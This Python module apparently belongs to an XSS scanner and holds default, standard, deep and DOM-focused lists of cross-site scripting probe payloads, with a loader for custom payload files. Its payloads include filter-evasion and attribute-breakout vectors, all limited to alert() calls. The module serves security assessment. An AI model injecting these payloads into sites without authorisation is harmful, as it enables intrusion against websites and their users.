"""OWASP Sentinel - XSSSpect Test Payloads & Loader Module.

Provides standard reflected XSS assessment probes, deep injection suites,
and file-based payload loading capabilities with comment and whitespace filtering.
"""

from pathlib import Path


# Exact base default probes for standard quick checks and specification compatibility
DEFAULT_PAYLOADS: list[str] = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "'><img src=x onerror=alert(1)>",
]

# Standard expanded suite (15 distinct probe vectors covering standard injection contexts)
STANDARD_PAYLOADS: list[str] = [
    # 1. Inline script tags
    "<script>alert(1)</script>",
    "<script>alert(document.domain)</script>",
    "</script><script>alert(1)</script>",
    # 2. Event handlers on media / void elements
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    # 3. Double-quote attribute breakouts
    "\"><script>alert(1)</script>",
    "\" onfocus=\"alert(1)\" autofocus=\"",
    "\"><svg onload=alert(1)>",
    # 4. Single-quote attribute breakouts
    "'><img src=x onerror=alert(1)>",
    "' onfocus='alert(1)' autofocus='",
    "';alert(1)//",
    # 5. Pseudo-protocol and autofocus elements
    "<input autofocus onfocus=alert(1)>",
    "<iframe src=\"javascript:alert(1)\">",
]

# Deep exhaustive suite (36 distinct vectors including bypasses, casing, and nested tags)
DEEP_PAYLOADS: list[str] = [
    # Base standard probes
    *STANDARD_PAYLOADS,
    # 6. Case alteration and whitespace evasion
    "<sCrIpt>alert(1)</sCrIpt>",
    "<svg/onload=alert(1)>",
    "<img/src=x/onerror=alert(1)>",
    "<dEtAiLs open onToGgLe=alert(1)>",
    # 7. Tag closers for common enclosing elements
    "</title><script>alert(1)</script>",
    "</textarea><script>alert(1)</script>",
    "-->\"><script>alert(1)</script>",
    # 8. Advanced HTML5 elements
    "<video src=1 onerror=alert(1)>",
    "<audio src=1 onerror=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<marquee onstart=alert(1)>",
    # 9. MathML / SVG foreignObject vectors
    "<math><mtext><table><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert(1) src=1>\">",
    "<svg><a href=\"javascript:alert(1)\"><text x=\"20\" y=\"20\">Test</text></a></svg>",
    # 10. Attribute and javascript execution contexts
    "\" autofocus onfocus=\"alert(1)\" x=\"",
    "' autofocus onfocus='alert(1)' x='",
    "\" onmouseover=\"alert(1)\" id=\"xss",
    "-alert(1)-",
    "\\'-alert(1)//",
    # 11. Template literals & expressions
    "${alert(1)}",
    "`+alert(1)+`",
    "javascript:alert(1)",
]

# DOM-focused suite (targeting client-side sinks, hash fragments, and innerHTML contexts)
DOM_PAYLOADS: list[str] = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\" onfocus=alert(1) autofocus=\"",
    "' onfocus=alert(1) autofocus='",
    "<iframe src=\"javascript:alert(1)\">",
    "javascript:alert(1)",
    "\" href=\"javascript:alert(1)\"",
    "' href='javascript:alert(1)'",
    "<details open ontoggle=alert(1)>",
    "<body onhashchange=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "${alert(1)}",
    "`+alert(1)+`",
    "\"><svg onload=alert(1)>",
    "'><svg onload=alert(1)>",
    "\\'-alert(1)//",
    "';alert(1)//",
]


def load_payloads(
    file_path: str | None = None,
    mode: str | None = None,
) -> list[str]:
    """Loads assessment payloads from file or selects a pre-configured assessment suite.

    When a file path is provided, reads payloads line-by-line, stripping leading/trailing
    whitespace and ignoring empty lines and comment lines starting with '#'.

    If no file path is provided, selects a built-in payload suite based on the scan mode:
    - mode="DEEP": Returns DEEP_PAYLOADS (36 distinct multi-context probes).
    - mode="DOM": Returns DOM_PAYLOADS (18 DOM sink and event handler probes).
    - mode="STANDARD": Returns STANDARD_PAYLOADS (15 core reflection probes).
    - mode=None: Returns DEFAULT_PAYLOADS (5 standard probes).

    Args:
        file_path: Optional path to a text file containing one payload per line.
        mode: Optional scan mode name ('STANDARD', 'DEEP', 'DOM').

    Returns:
        list[str]: A list of clean payload strings ready for parameter injection.

    Raises:
        FileNotFoundError: If the specified file_path does not exist on disk.
        OSError: If an error occurs reading the file from the filesystem.
    """
    if file_path is not None:
        resolved_path = Path(file_path)
        if not resolved_path.is_file():
            raise FileNotFoundError(f"Payload file not found: {file_path}")

        payloads: list[str] = []
        with resolved_path.open("r", encoding="utf-8") as f:
            for line in f:
                stripped = line.strip()
                if not stripped or stripped.startswith("#"):
                    continue
                payloads.append(stripped)

        return payloads

    if mode is not None:
        norm_mode = mode.upper().strip()
        if norm_mode == "DEEP":
            return DEEP_PAYLOADS
        if norm_mode == "DOM":
            return DOM_PAYLOADS
        if norm_mode == "STANDARD":
            return STANDARD_PAYLOADS

    return DEFAULT_PAYLOADS
